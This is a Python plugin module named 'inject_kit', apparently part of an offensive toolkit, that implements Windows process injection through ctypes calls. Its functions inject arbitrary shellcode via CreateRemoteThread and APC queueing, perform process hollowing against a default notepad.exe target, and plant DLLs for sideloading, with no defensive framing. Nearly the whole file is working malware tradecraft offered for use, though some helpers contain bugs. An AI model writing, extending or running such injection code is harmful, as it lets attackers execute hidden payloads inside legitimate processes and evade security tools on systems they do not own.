"""
inject_kit — Titan-Inject / Rust-Sniper.
Injection de processus: CreateRemoteThread, APC, process hollowing, DLL sideload.
Windows uniquement (echec gracieux ailleurs).
Actions: remote_thread, apc, hollow, sideload, list
"""
NAME = "inject_kit"
VERSION = "1.0.0"
DESCRIPTION = "Injection de processus: thread distant, APC, hollowing (Titan-Inject, Rust-Sniper)."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows"]

import base64
import os
import struct
import sys

try:
    import ctypes
except Exception:
    ctypes = None

K32 = None
NTDLL = None
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
PROCESS_ALL_ACCESS = 0x1F0FFF


def _result(data=None, error=None, status="completed"):
    return {"status": status, "data": data, "error": error}


def _win32():
    global K32, NTDLL
    if os.name != "nt":
        return False
    K32 = ctypes.windll.kernel32
    NTDLL = ctypes.windll.ntdll
    return True


def run(action, params):
    if not _win32():
        return _result(error="inject_kit requires Windows", status="failed")
    try:
        if action == "remote_thread":
            return _remote_thread(params)
        if action == "apc":
            return _apc(params)
        if action == "hollow":
            return _hollow(params)
        if action == "sideload":
            return _sideload(params)
        if action == "list":
            return _list_procs(params)
        return _result(error="Unknown action: " + str(action), status="failed")
    except Exception as exc:
        return _result(error="inject_kit: " + str(exc), status="failed")


def _pe_info(data):
    if data[:2] != b"MZ":
        raise ValueError("Not a PE file")
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    coff = e_lfanew + 4
    nsec = struct.unpack_from("<H", data, coff + 2)[0]
    opt_off = coff + 20
    magic = struct.unpack_from("<H", data, opt_off)[0]
    pe32 = magic == 0x10B
    if pe32:
        entry = struct.unpack_from("<I", data, opt_off + 16)[0]
        image_base = struct.unpack_from("<I", data, opt_off + 28)[0]
        size_image = struct.unpack_from("<I", data, opt_off + 56)[0]
    else:
        entry = struct.unpack_from("<I", data, opt_off + 16)[0]
        image_base = struct.unpack_from("<Q", data, opt_off + 24)[0]
        size_image = struct.unpack_from("<I", data, opt_off + 56)[0]
    sec_off = opt_off + struct.unpack_from("<H", data, coff + 16)[0]
    sections = []
    for i in range(nsec):
        off = sec_off + i * 40
        vsize, vaddr, raw_size, raw_ptr = struct.unpack_from("<IIII", data, off + 8)
        sections.append((vaddr, vsize, raw_ptr, raw_size))
    return {"entry": entry, "image_base": image_base,
            "size_image": size_image, "sections": sections,
            "headers_size": min(0x1000, len(data))}


def _payload(params):
    raw = params.get("data", "")
    if raw.startswith("0x") or (chr(92) + "x") in raw:
        hexes = raw.replace(chr(92) + "x", " ").split()
        return bytes(int(h, 16) for h in hexes)
    return base64.b64decode(raw)


def _open_target(params):
    pid = int(params.get("pid", 0))
    name = params.get("name", "")
    if pid:
        return pid
    if name:
        procs = _list_procs(params).get("data", {}).get("processes", [])
        for proc in procs:
            if name.lower() in proc["name"].lower():
                return proc["pid"]
    raise ValueError("Target process not found (pid or name)")


def _list_procs(params):
    results = []
    snap = K32.CreateToolhelp32Snapshot(0x00000002, 0)
    if snap == -1 or not snap:
        return _result(data={"processes": results})
    class PE32(ctypes.Structure):
        _fields_ = [("dwSize", ctypes.c_uint32), ("cntUsage", ctypes.c_uint32),
                    ("th32ProcessID", ctypes.c_uint32),
                    ("th32DefaultHeapID", ctypes.c_void_p),
                    ("th32ModuleID", ctypes.c_uint32),
                    ("cntThreads", ctypes.c_uint32),
                    ("th32ParentProcessID", ctypes.c_uint32),
                    ("pcPriClassBase", ctypes.c_int32),
                    ("dwFlags", ctypes.c_uint32),
                    ("szExeFile", ctypes.c_char * 260)]
    entry = PE32()
    entry.dwSize = ctypes.sizeof(PE32)
    ok = K32.Process32First(snap, ctypes.byref(entry))
    while ok:
        results.append({"pid": int(entry.th32ProcessID),
                        "parent": int(entry.th32ParentProcessID),
                        "name": entry.szExeFile.decode("latin1", "replace")})
        ok = K32.Process32Next(snap, ctypes.byref(entry))
    K32.CloseHandle(snap)
    return _result(data={"processes": results[:int(params.get("limit", 200))]})


def _remote_thread(params):
    pid = _open_target(params)
    blob = _payload(params)
    h = K32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h:
        raise ValueError("OpenProcess failed")
    buf = K32.VirtualAllocEx(h, None, len(blob), MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE)
    if not buf:
        K32.CloseHandle(h)
        raise ValueError("VirtualAllocEx failed")
    written = ctypes.c_size_t(0)
    K32.WriteProcessMemory(h, buf, blob, len(blob), ctypes.byref(written))
    tid = K32.CreateRemoteThread(h, None, 0, buf, None, 0, None)
    K32.CloseHandle(h)
    return _result(data={"pid": pid, "injected_bytes": int(written.value),
                         "tid": int(tid or 0)})


def _apc(params):
    pid = _open_target(params)
    blob = _payload(params)
    h = K32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h:
        raise ValueError("OpenProcess failed")
    buf = K32.VirtualAllocEx(h, None, len(blob), MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE)
    if not buf:
        K32.CloseHandle(h)
        raise ValueError("VirtualAllocEx failed")
    written = ctypes.c_size_t(0)
    K32.WriteProcessMemory(h, buf, blob, len(blob), ctypes.byref(written))
    queued = 0
    snap = K32.CreateToolhelp32Snapshot(0x00000004, pid)
    if snap != -1 and snap:
        class TE32:
            _fields_ = [("dwSize", ctypes.c_uint32), ("cntUsage", ctypes.c_uint32),
                        ("th32ThreadID", ctypes.c_uint32),
                        ("th32OwnerProcessID", ctypes.c_uint32),
                        ("tpBasePri", ctypes.c_int32),
                        ("tpDeltaPri", ctypes.c_int32),
                        ("dwFlags", ctypes.c_uint32)]
        t = TE32()
        t.dwSize = ctypes.sizeof(TE32)
        ok = K32.Thread32First(snap, ctypes.byref(t))
        while ok:
            if int(t.th32OwnerProcessID) == pid:
                if K32.QueueUserAPC(buf, h, t.th32ThreadID):
                    queued += 1
            ok = K32.Thread32Next(snap, ctypes.byref(t))
        K32.CloseHandle(snap)
    K32.CloseHandle(h)
    return _result(data={"pid": pid, "apc_queued": queued})


def _get_thread_context(hthread):
    SIZE64, SIZE32 = 1232, 716
    is64 = sys.maxsize > 2 ** 32
    size = SIZE64 if is64 else SIZE32
    ctx = (ctypes.c_byte * size)()
    ctypes.c_uint32.from_address(ctypes.addressof(ctx)).value = 0x100000  # CONTEXT_FULL
    if not K32.GetThreadContext(ctypes.c_void_p(hthread), ctx):
        raise ValueError("GetThreadContext failed")
    return ctx


def _ctx_entry_offset(is64):
    return 0xF8 if is64 else 0xB8  # Rip / Eip


def _set_entry(ctx, value):
    is64 = sys.maxsize > 2 ** 32
    off = _ctx_entry_offset(is64)
    if is64:
        ctypes.c_uint64.from_address(ctypes.addressof(ctx) + off).value = value
    else:
        ctypes.c_uint32.from_address(ctypes.addressof(ctx) + off).value = value


def _hollow(params):
    target = params.get("target", "C:" + bs + "Windows" + bs + "System32" + bs + "notepad.exe")

    blob = _payload(params)
    info = _pe_info(blob)
    class PI(ctypes.Structure):
        _fields_ = [("hProcess", ctypes.c_void_p), ("hThread", ctypes.c_void_p),
                    ("dwProcessId", ctypes.c_uint32), ("dwThreadId", ctypes.c_uint32)]
    si = ctypes.c_void_p()
    pi = PI()
    CREATE_SUSPENDED = 0x00000004
    ok = K32.CreateProcessW(target, None, None, None, False, CREATE_SUSPENDED,
                            None, None, ctypes.byref(si), ctypes.byref(pi))
    if not ok:
        raise ValueError("CreateProcessW failed: " + target)
    hproc = ctypes.c_void_p(pi.hProcess)
    hthread = ctypes.c_void_p(pi.hThread)
    try:
        NTDLL.NtUnmapViewOfSection(hproc, ctypes.c_void_p(info["image_base"]))
        buf = K32.VirtualAllocEx(hproc, ctypes.c_void_p(info["image_base"]),
                                 info["size_image"], MEM_COMMIT | MEM_RESERVE,
                                 PAGE_EXECUTE_READWRITE)
        if not buf:
            buf = K32.VirtualAllocEx(hproc, None, info["size_image"],
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE)
        if not buf:
            raise ValueError("VirtualAllocEx image failed")
        written = ctypes.c_size_t(0)
        K32.WriteProcessMemory(hproc, buf, blob, info["headers_size"],
                               ctypes.byref(written))
        for vaddr, vsize, raw_ptr, raw_size in info["sections"]:
            if raw_size == 0:
                continue
            chunk = blob[raw_ptr:raw_ptr + raw_size]
            K32.WriteProcessMemory(hproc, buf + vaddr, chunk, len(chunk),
                                   ctypes.byref(written))
        ctx = _get_thread_context(hthread)
        _set_entry(ctx, buf + info["entry"])
        K32.SetThreadContext(hthread, ctx)
        K32.ResumeThread(hthread)
        return _result(data={"pid": int(pi.dwProcessId), "hollowed": True,
                             "base": hex(buf), "entry": hex(buf + info["entry"])})
    except Exception:
        K32.TerminateProcess(hproc, 0)
        K32.CloseHandle(hproc)
        K32.CloseHandle(hthread)
        raise


def _sideload(params):
    dll = params.get("dll", "")
    app_dir = params.get("app_dir", "")
    if not dll or not app_dir or not os.path.isfile(dll):
        raise ValueError("sideload needs dll (existing file) + app_dir")
    dest = os.path.join(app_dir, os.path.basename(dll))
    if os.path.abspath(dest).lower() == os.path.abspath(dll).lower():
        raise ValueError("Source equals destination")
    import shutil
    shutil.copy2(dll, dest)
    return _result(data={"copied": dest})
